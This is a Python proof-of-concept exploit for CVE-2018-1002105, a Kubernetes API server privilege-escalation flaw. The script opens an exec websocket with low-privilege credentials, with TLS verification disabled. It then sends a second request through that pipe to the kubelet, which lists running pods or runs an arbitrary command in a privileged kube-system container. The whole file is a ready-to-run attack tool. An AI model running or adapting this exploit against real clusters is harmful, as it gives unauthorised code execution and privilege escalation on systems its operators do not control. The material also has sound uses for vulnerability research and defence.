#!/usr/bin/env python3
import argparse, ssl, socket
from secrets import base64, token_bytes

def request_stage1(namespace, pod, target):
    stage1 = "GET /api/v1/namespaces/{0}/pods/{1}/exec HTTP/1.1\r\nHost: {2}\r\nConnection: upgrade\r\nUpgrade: websocket\r\n\r\n\r\n"
    return stage1.format(namespace, pod, target).encode('utf-8')

def request_stage1_token(namespace, pod, target, token):
    stage1 = "GET /api/v1/namespaces/{0}/pods/{1}/exec HTTP/1.1\r\nHost: {2}\r\nAuthorization: Bearer {3}\r\nConnection: upgrade\r\nUpgrade: websocket\r\n\r\n\r\n"
    return stage1.format(namespace, pod, target, token).encode('utf-8')

def request_stage2(namespace, pod, container, command, target):
    stage2 = "GET /exec/{0}/{1}/{2}?{3}&input=1&output=1&tty=0 HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nHost: {4}\r\nOrigin: http://{4}\r\nSec-WebSocket-Key: {5}\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: v4.channel.k8s.io\r\n\r\n\r\n"
    command = f"command={'&command='.join(command.split(' '))}"
    key = base64.b64encode(token_bytes(20)).decode('utf-8')
    return stage2.format(namespace, pod, container, command, target, key).encode('utf-8')

def request_stage2_pods(target):
    stage2 = "GET /runningpods/ HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nHost: {0}\r\nOrigin: http://{0}\r\nSec-WebSocket-Key: {1}\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: v4.channel.k8s.io\r\n\r\n\r\n"
    key = base64.b64encode(token_bytes(20)).decode('utf-8')
    return stage2.format(target, key).encode('utf-8')


def run(args, stage1, stage2):
    target = args.target
    host, port = target.split(':')
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
    ctx.verify_mode = ssl.CERT_NONE
    if args.cert and args.key:
        ctx.load_cert_chain(args.cert, args.key)
    with socket.socket() as sock:
        with ctx.wrap_socket(sock, False) as ssock:
            ssock.connect((host, int(port)))
            print(f"[*] Building pipe using exec...")
            ssock.send(stage1)
            r = ssock.recv(4096)
            if b'you must specify at least 1 of stdin' in r:
                print('[+] Pipe opened :D')
            else:
                print(r)
                print('[-] Not sure if this went well...')
                return False
            ssock.send(stage2)

            data = []
            if not args.container:
                while True:
                    r = ssock.recv(4096)
                    data.append(r)
                    if len(r) < 4096:
                        break
                print(''.join(msg.decode('unicode-escape') for msg in data))
                print('[+] Done!')
                return True

            r = ssock.recv(4096)
            print(r)
            if b'HTTP/1.1 101 Switching Protocols' not in r:
                print('[-] Exploit failed :(')
                return False

            while True:
                data_in = ssock.recv(4096)
                data.append(data_in)
                if b'\x82\x01\x01' not in data_in and len(data_in) < 4096:
                    break

            for d in data:
                if b'\x82\x01\x01' in d:
                    continue
                d1 = d.split(b'\x01')[1]
                print(d1.decode("utf-8"))
            
            print("[+] Done!")

    return True


def main():
    parser = argparse.ArgumentParser(description='PoC for CVE-2018-1002105.')

    required = parser.add_argument_group('required arguments')
    optional = parser.add_argument_group('optional arguments')

    required.add_argument('--target', '-t', dest='target', type=str, help='API server target:port', required=True)
    required.add_argument('--pod', '-p', dest='pod', type=str, help='Pod with method access', required=True)
    required.add_argument('--namespace', '-n', dest='namespace', type=str, help='Namespace with method access', default='default')
    optional.add_argument('--jwt', '-j', dest='token', type=str, help='JWT token for service account')
    optional.add_argument('--cert', '-f', dest='cert', type=str, help='Certificate for user')
    optional.add_argument('--key', '-k', dest='key', type=str, help='Certificate key for user')
    optional.add_argument('--privileged-namespace', '-s', dest='pnamespace', help='Target namespace', default='kube-system')
    optional.add_argument('--privileged-pod', '-e', dest='ppod', type=str, help='Target privileged pod')
    optional.add_argument('--container', '-c', dest='container', type=str, help='Target container')
    optional.add_argument('--command', '-x', dest='command', type=str, help='Command to execute', default='hostname')

    args = parser.parse_args()

    if args.target.find(':') == -1:
        print(f"[-] invalid target {args.target}")
        return False

    if args.cert and args.key:
        stage1 = request_stage1(args.namespace, args.pod, args.target)
    elif args.token:
        stage1 = request_stage1_token(args.namespace, args.pod, args.target, args.token)
    else:
        print(f"[-] invalid authentication")
        return False

    if args.container:
        stage2 = request_stage2(args.pnamespace, args.ppod, args.container, args.command, args.target)
    else:
        stage2 = request_stage2_pods(args.target)

    return run(args, stage1, stage2)


if __name__ == '__main__':
    main()
